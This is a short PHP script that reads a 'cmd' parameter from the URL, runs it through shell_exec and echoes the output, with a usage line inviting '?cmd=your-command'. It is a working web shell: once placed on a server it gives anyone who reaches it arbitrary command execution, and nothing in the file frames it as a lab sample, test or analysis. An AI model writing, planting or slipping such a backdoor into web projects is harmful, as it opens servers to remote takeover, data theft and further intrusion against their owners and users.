<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Running: $cmd\n";
    $output = shell_exec($cmd . ' 2>&1');
    echo $output;
} else {
    echo "No command specified. Usage: ?cmd=your-command";
}
